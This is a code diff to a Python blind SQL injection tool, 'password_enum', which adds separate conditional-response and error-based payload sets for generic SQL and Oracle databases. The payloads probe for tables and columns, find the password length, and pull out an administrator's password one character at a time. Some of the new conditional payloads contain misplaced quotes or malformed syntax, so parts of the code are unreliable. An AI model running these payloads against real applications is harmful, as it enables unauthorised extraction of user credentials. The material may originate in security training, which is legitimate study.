@@ -15,7 +15,7 @@ from string import Template
 parser = argparse.ArgumentParser("password_enum")
 
 parser.add_argument(
-    "--type", help="The method of injection to use.", choices=['error', 'dom', 'delay'], default='error')
+    "--type", help="The method of injection to use.", choices=['error', 'conditional', 'delay'], default='error')
 parser.add_argument(
     "--success", help="A string to search for in the response that denotes successful execution.", type=str, default="Internal Server Error")
 parser.add_argument(
@@ -44,20 +44,36 @@ FIELD_LENGTH_LIMIT = 50
 # 1 - When using conditional errors, if the error is present, we consider that as successful.
 # 1 - When using conditional responses, if the --success string is present, we consider that as successful.
 SQL = {
-    'BASIC': "' || (SELECT '') || '",
-    'CONDITIONAL_SUBSTRING_ENUM': "' || (SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE $columnName='$columnValue')||",
-    'TABLE_CHECK': "' || (SELECT '' FROM $tableName) || '",
-    'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
-    'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH(password)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
-    'VALUE_CHECK': "' || (SELECT CASE WHEN SUBSTR(password, $currentIndex, 1)='$currentValue' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
+    'conditional': {
+        'BASIC': "' || (SELECT '') || '",
+        'TABLE_CHECK': "' AND (SELECT 'a' FROM $tableName LIMIT 1)='a",
+        'COLUMN_CHECK': "' AND (SELECT 'a' FROM $tableName WHERE $columnName='$columnValue')=a'",
+        'LENGTH_CHECK': "' AND (SELECT 'a' WHEN LENGTH(password)=$lengthTndex FROM users WHERE $columnName='$columnValue')=a",
+        'VALUE_CHECK': "' AND (SELECT SUBSTRING(password, $currentIndex, 1) FROM $tableName WHERE username='administrator') = '$currentValue"
+    },
+    'error': {
+        'BASIC': "' || (SELECT '') || '",
+        'TABLE_CHECK': "' || (SELECT '' FROM $tableName) || '",
+        'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
+        'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH(password)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
+        'VALUE_CHECK': "' || (SELECT CASE WHEN SUBSTRING(password, $currentIndex, 1)='$currentValue' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
+    }
 }
 ORACLE = {
-    'BASIC': "' || (SELECT '' from dual) || '",
-    'CONDITIONAL_SUBSTRING_ENUM': "' || (SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE $columnName='$columnValue')||",
-    'TABLE_CHECK': "' || (SELECT '' FROM $tableName WHERE ROWNUM = 1) || '",
-    'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
-    'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH(password)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
-    'VALUE_CHECK': "' || (SELECT CASE WHEN SUBSTR(password, $currentIndex, 1)='$currentValue' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
+    'conditional': {
+        'BASIC': "' || (SELECT '' from dual) || '",
+        'TABLE_CHECK': "' AND (SELECT 'a' FROM $tableName WHERE ROWNUM = 1)='a",
+        'COLUMN_CHECK': "' AND (SELECT 'a' FROM $tableName WHERE $columnName='$columnValue')=a'",
+        'LENGTH_CHECK': "' AND (SELECT 'a' WHEN LENGTH(password)=$lengthTndex FROM users WHERE $columnName='$columnValue')=a",
+        'VALUE_CHECK': "' AND (SELECT SUBSTRING(password, $currentIndex, 1) FROM $tableName WHERE username='administrator') = '$currentValue"
+    },
+    'error': {
+        'BASIC': "' || (SELECT '' from dual) || '",
+        'TABLE_CHECK': "' || (SELECT '' FROM $tableName WHERE ROWNUM = 1) || '",
+        'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
+        'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH(password)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
+        'VALUE_CHECK': "' || (SELECT CASE WHEN SUBSTR(password, $currentIndex, 1)='$currentValue' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
+    }
 }
 
 args = parser.parse_args()
@@ -102,12 +118,12 @@ enumerated_value = ""
 def isSqlCompatible():
     global dbVersion
     print("Checking SQL is being used")
-    inject(SQL["BASIC"], False)
+    inject(SQL[args.type]["BASIC"], False)
     if not executeRequestAndReturnsError():
         dbVersion = "SQL"
         return True
 
-    inject(ORACLE["BASIC"], False)
+    inject(ORACLE[args.type]["BASIC"], False)
     if not executeRequestAndReturnsError():
         dbVersion = "ORACLE"
         return True
@@ -118,9 +134,9 @@ def isSqlCompatible():
 def getSQLCommand(key):
     match dbVersion:
         case "SQL":
-            return SQL[key]
+            return SQL[args.type][key]
         case "ORACLE":
-            return ORACLE[key]
+            return ORACLE[args.type][key]
         case _:
             print(f"Unknow database version detected, exiting as this is not supported.")
             sys.exit()
